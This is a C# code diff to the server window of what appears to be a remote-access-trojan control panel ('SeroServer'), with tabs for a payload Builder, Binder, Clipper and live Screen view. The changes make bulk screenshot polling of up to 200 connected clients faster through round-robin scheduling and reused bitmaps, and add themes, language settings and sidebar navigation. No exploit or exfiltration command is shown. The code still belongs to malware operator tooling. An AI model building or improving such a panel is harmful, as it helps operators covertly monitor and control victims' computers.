@@ -318,6 +318,8 @@ public partial class ServerWindow : Window
             RefreshAllClients();
             LoadConfig();
             LoadSoundPreferences();
+            ApplyStoredTheme();
+            ApplyStoredLanguage();
             NotificationService.Initialize(SettingsNotifySound.IsChecked == true, SettingsNotifyVisual.IsChecked == true);
             // Initialize default host if empty
             if (BldHosts.Items.Count == 0)
@@ -4715,6 +4717,10 @@ Read-Host 'Press Enter to close'
     private readonly Dictionary<string, System.Windows.Controls.Image>  _screenTiles   = new();
     private readonly Dictionary<string, System.Windows.Controls.Border> _screenBorders = new();
     private readonly HashSet<string> _screenHandlers = new();
+    // Reused WriteableBitmap per tile — avoids allocating a new WIC texture every frame
+    private readonly Dictionary<string, System.Windows.Media.Imaging.WriteableBitmap> _tileWb = new();
+    private int _screenRoundRobinOffset;
+    private const int ScreenMaxPerTick = 50;
 
     // ── Binder ──────────────────────────────────────────────────────────
     private readonly ObservableCollection<SeroServer.Binder.BinderEntry> _binderEntries = [];
@@ -4789,10 +4795,19 @@ Read-Host 'Press Enter to close'
             }
             _screenTiles.Remove(key);
             _screenBorders.Remove(key);
+            _tileWb.Remove(key);
         }
 
-        foreach (var client in clients)
+        int total = clients.Count;
+        if (total == 0) return;
+
+        // Stagger: send to at most ScreenMaxPerTick clients per tick, rotating across all
+        // so 200 clients at 50/tick × 3s = each client refreshed every ~12s max
+        _screenRoundRobinOffset %= total;
+        int count = Math.Min(ScreenMaxPerTick, total);
+        for (int i = 0; i < count; i++)
         {
+            var client = clients[(_screenRoundRobinOffset + i) % total];
             EnsureScreenTile(client);
             if (!_screenHandlers.Contains(client.Id))
             {
@@ -4803,6 +4818,7 @@ Read-Host 'Press Enter to close'
             }
             _ = _server.SendToClient(client.Id, new Packet { Type = PacketType.Screenshot });
         }
+        _screenRoundRobinOffset = (_screenRoundRobinOffset + count) % total;
     }
 
     private static System.Windows.DependencyObject? VisualTreeHelperGetParent(
@@ -4943,20 +4959,43 @@ Read-Host 'Press Enter to close'
         {
             var result = Newtonsoft.Json.JsonConvert.DeserializeObject<ScreenshotResultData>(json);
             if (result == null || string.IsNullOrEmpty(result.Data)) return;
-            Dispatcher.BeginInvoke(() =>
+            var b64 = result.Data;
+
+            // Decode JPEG off the UI thread, then blit pixels into reused WriteableBitmap
+            System.Threading.Tasks.Task.Run(() =>
             {
                 try
                 {
-                    var bytes = Convert.FromBase64String(result.Data);
+                    var bytes = Convert.FromBase64String(b64);
                     using var ms = new System.IO.MemoryStream(bytes);
-                    var bmp = new System.Windows.Media.Imaging.BitmapImage();
-                    bmp.BeginInit();
-                    bmp.CacheOption = System.Windows.Media.Imaging.BitmapCacheOption.OnLoad;
-                    bmp.StreamSource = ms;
-                    bmp.EndInit();
-                    bmp.Freeze();
-                    if (_screenTiles.TryGetValue(clientId, out var img))
-                        img.Source = bmp;
+                    var decoder = System.Windows.Media.Imaging.BitmapDecoder.Create(
+                        ms,
+                        System.Windows.Media.Imaging.BitmapCreateOptions.None,
+                        System.Windows.Media.Imaging.BitmapCacheOption.OnLoad);
+                    var frame = decoder.Frames[0];
+                    var src = new System.Windows.Media.Imaging.FormatConvertedBitmap(
+                        frame, System.Windows.Media.PixelFormats.Bgr32, null, 0);
+                    src.Freeze();
+                    int w = src.PixelWidth, h = src.PixelHeight, stride = w * 4;
+                    var pixels = new byte[stride * h];
+                    src.CopyPixels(pixels, stride, 0);
+
+                    Dispatcher.BeginInvoke(() =>
+                    {
+                        if (!_screenTiles.TryGetValue(clientId, out var img)) return;
+                        if (!_tileWb.TryGetValue(clientId, out var wb)
+                            || wb.PixelWidth != w || wb.PixelHeight != h)
+                        {
+                            wb = new System.Windows.Media.Imaging.WriteableBitmap(
+                                w, h, 96, 96, System.Windows.Media.PixelFormats.Bgr32, null);
+                            _tileWb[clientId] = wb;
+                            img.Source = wb;
+                        }
+                        wb.Lock();
+                        wb.WritePixels(new Int32Rect(0, 0, w, h), pixels, stride, 0);
+                        wb.AddDirtyRect(new Int32Rect(0, 0, w, h));
+                        wb.Unlock();
+                    });
                 }
                 catch { }
             });
@@ -5208,14 +5247,144 @@ Read-Host 'Press Enter to close'
                 () => ScreenScroll_SizeChanged(ScreenScroll, null!));
 
         var presenter = MainTabControl.Template?.FindName("PART_SelectedContentHost", MainTabControl) as ContentPresenter;
-        if (presenter == null) return;
+        if (presenter != null)
+        {
+            var ease = new System.Windows.Media.Animation.CubicEase { EasingMode = System.Windows.Media.Animation.EasingMode.EaseOut };
+            presenter.BeginAnimation(OpacityProperty,
+                new DoubleAnimation(0, 1, TimeSpan.FromMilliseconds(220)) { EasingFunction = ease });
+        }
 
-        // Fade-in only — BlurEffect removed: WPF BlurEffect uses DirectX pixel shaders that
-        // cause colored rendering artifacts in Hyper-V (synthetic display adapter doesn't
-        // support the intermediate render targets WPF bitmap effects require).
-        var ease = new System.Windows.Media.Animation.CubicEase { EasingMode = System.Windows.Media.Animation.EasingMode.EaseOut };
-        presenter.BeginAnimation(OpacityProperty,
-            new DoubleAnimation(0, 1, TimeSpan.FromMilliseconds(220)) { EasingFunction = ease });
+        SyncNavButtons(MainTabControl.SelectedIndex);
+    }
+
+    // ── Sidebar navigation ───────────────────────────────────────────
+
+    private bool _navSyncing;
+
+    private void Nav_Checked(object sender, RoutedEventArgs e)
+    {
+        if (_navSyncing || !IsLoaded) return;
+        if (sender is not System.Windows.Controls.RadioButton rb) return;
+        int idx = rb.Name switch
+        {
+            "NavDashboard"  => 0,
+            "NavOnline"     => 1,
+            "NavAllClients" => 2,
+            "NavBuilder"    => 3,
+            "NavAutoTask"   => 4,
+            "NavScreen"     => 5,
+            "NavClipper"    => 6,
+            "NavBinder"     => 7,
+            "NavLogs"       => 8,
+            "NavSettings"   => 9,
+            "NavAbout"      => 10,
+            _               => -1
+        };
+        if (idx >= 0 && MainTabControl.SelectedIndex != idx)
+            MainTabControl.SelectedIndex = idx;
+    }
+
+    private void SyncNavButtons(int idx)
+    {
+        _navSyncing = true;
+        System.Windows.Controls.RadioButton?[] btns =
+        [
+            NavDashboard, NavOnline, NavAllClients, NavBuilder, NavAutoTask,
+            NavScreen, NavClipper, NavBinder, NavLogs, NavSettings, NavAbout
+        ];
+        if (idx >= 0 && idx < btns.Length)
+        {
+            var btn = btns[idx];
+            if (btn != null && btn.IsChecked != true) btn.IsChecked = true;
+        }
+        _navSyncing = false;
+    }
+
+    // ── Theme ────────────────────────────────────────────────────────
+
+    private static readonly Dictionary<string, System.Windows.Media.Color> _themeColors = new()
+    {
+        ["SeroDark"] = System.Windows.Media.Color.FromRgb(0x4A, 0x85, 0xF5),
+        ["Classic"]  = System.Windows.Media.Color.FromRgb(0x5B, 0x7F, 0xC7),
+        ["Crimson"]  = System.Windows.Media.Color.FromRgb(0xEF, 0x44, 0x44),
+        ["Phantom"]  = System.Windows.Media.Color.FromRgb(0x7C, 0x5C, 0xE8),
+        ["Matrix"]   = System.Windows.Media.Color.FromRgb(0x22, 0xC5, 0x5E),
+        ["Ember"]    = System.Windows.Media.Color.FromRgb(0xF5, 0x9E, 0x0B),
+    };
+
+    private void ApplyTheme(string name)
+    {
+        if (!_themeColors.TryGetValue(name, out var color)) return;
+        var brush = new System.Windows.Media.SolidColorBrush(color);
+        brush.Freeze();
+        Resources["AccentBrush"] = brush;
+
+        // Update aurora bar gradient stops to match accent
+        if (AuroraBar.Fill is System.Windows.Media.LinearGradientBrush lgb && lgb.GradientStops.Count >= 7)
+        {
+            lgb.GradientStops[0].Color = color;
+            lgb.GradientStops[6].Color = color;
+        }
+    }
+
+    private void ApplyStoredTheme()
+    {
+        var name = UiPrefs.GetString("Theme", "SeroDark");
+        ApplyTheme(name);
+
+        // Sync radio buttons
+        System.Windows.Controls.RadioButton? rb = name switch
+        {
+            "Classic"  => ThemeClassic,
+            "Crimson"  => ThemeCrimson,
+            "Phantom"  => ThemePhantom,
+            "Matrix"   => ThemeMatrix,
+            "Ember"    => ThemeEmber,
+            _          => ThemeSeroDark,
+        };
+        if (rb != null) rb.IsChecked = true;
+    }
+
+    private void SettingsTheme_Changed(object sender, RoutedEventArgs e)
+    {
+        if (!IsLoaded || sender is not System.Windows.Controls.RadioButton rb) return;
+        string name = rb.Name switch
+        {
+            "ThemeClassic"  => "Classic",
+            "ThemeCrimson"  => "Crimson",
+            "ThemePhantom"  => "Phantom",
+            "ThemeMatrix"   => "Matrix",
+            "ThemeEmber"    => "Ember",
+            _               => "SeroDark",
+        };
+        ApplyTheme(name);
+        UiPrefs.Set("Theme", name);
+    }
+
+    // ── Language ─────────────────────────────────────────────────────
+
+    private void ApplyStoredLanguage()
+    {
+        var lang = UiPrefs.GetString("Language", "en");
+        for (int i = 0; i < SettingsLanguage.Items.Count; i++)
+        {
+            if (SettingsLanguage.Items[i] is System.Windows.Controls.ComboBoxItem item
+                && item.Tag?.ToString() == lang)
+            {
+                SettingsLanguage.SelectedIndex = i;
+                break;
+            }
+        }
+    }
+
+    private void SettingsLanguage_Changed(object sender, SelectionChangedEventArgs e)
+    {
+        if (!IsLoaded) return;
+        if (SettingsLanguage.SelectedItem is System.Windows.Controls.ComboBoxItem item
+            && item.Tag is string tag)
+        {
+            UiPrefs.Set("Language", tag);
+        }
     }
 
     // --- Grid Visibility, Filters, and Tag Customizations ---
